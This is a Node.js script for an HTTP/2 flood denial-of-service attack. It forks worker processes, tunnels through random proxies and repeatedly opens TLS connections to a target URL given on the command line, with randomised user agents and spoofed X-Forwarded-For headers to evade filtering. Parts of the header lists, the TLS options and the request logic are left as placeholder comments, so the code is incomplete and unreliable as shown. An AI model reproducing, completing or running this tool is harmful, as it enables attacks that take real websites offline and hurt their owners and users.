const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const fakeua = require('fake-useragent');

const acceptHeader = [
  // ... your accept header values
];

const langHeader = [
  // ... your lang header values
];

const encodingHeader = [
  // ... your encoding header values
];

const controlHeader = [
  // ... your control header values
];

function getRandomElement(array) {
  return array[Math.floor(Math.random() * array.length)];
}

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyList = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g);

function getRandomProxy() {
  return proxyList[Math.floor(Math.random() * proxyList.length)];
}

if (cluster.isMaster) {
  // ... cluster master code

  for (let bb = 0; bb < thread; bb++) {
    cluster.fork();
  }

  setTimeout(() => {
    process.exit(-1);
  }, time * 1000);
} else {
  // ... cluster worker code

  function flood() {
    const parsed = url.parse(target);
    const userAgent = fakeua();

    const proxy = getRandomProxy().split(':');

    const header = {
      ":path": parsed.path,
      "X-Forwarded-For": proxy[0],
      "X-Forwarded-Host": proxy[0],
      ":method": "GET",
      "User-agent": userAgent,
      "Origin": target,
      "Accept": getRandomElement(acceptHeader),
      "Accept-Encoding": getRandomElement(encodingHeader),
      "Accept-Language": getRandomElement(langHeader),
      "Cache-Control": getRandomElement(controlHeader),
    };

    const agent = new http.Agent({
      keepAlive: true,
      keepAliveMsecs: 10000,
      maxSockets: 0,
    });

    const req = http.request({
      host: proxy[0],
      agent: agent,
      globalAgent: agent,
      port: proxy[1],
      headers: {
        'Host': parsed.host,
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive',
      },
      method: 'CONNECT',
      path: parsed.host + ':443',
    }, function() {
      req.setSocketKeepAlive(true);
    });

    req.on('connect', function(res, socket, head) {
      const client = http2.connect(parsed.href, {
        createConnection: () => tls.connect({
          host: parsed.host,
          // ... other TLS options
          socket: socket,
        }, function() {
          // ... HTTP/2 request logic
        }),
      });
    });

    req.end();
  }

  setInterval(() => {
    flood();
  });
}
